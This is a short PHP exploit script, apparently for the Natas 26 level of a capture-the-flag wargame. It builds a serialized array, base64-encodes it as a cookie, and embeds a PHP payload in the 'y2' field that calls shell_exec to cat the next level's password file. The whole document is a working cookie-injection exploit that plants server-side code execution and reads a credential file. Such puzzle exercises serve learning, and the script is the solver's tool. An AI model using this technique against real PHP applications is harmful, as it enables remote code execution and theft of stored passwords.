<?php
$payload[]=array();
$payload["x1"]=0;

$payload["x2"]=400;
$payload["y1"]=0;
$payload["y2"]="\$'\100'\x00<?php \$password=shell_exec('cat /etc/natas_webpass/natas27');echo \$password;?>";
echo $payload['y2'];

$ser=serialize($payload);
echo"\n$ser\n";
$basi=base64_encode($ser);
echo "\ncookie: '$basi'\n";

?>
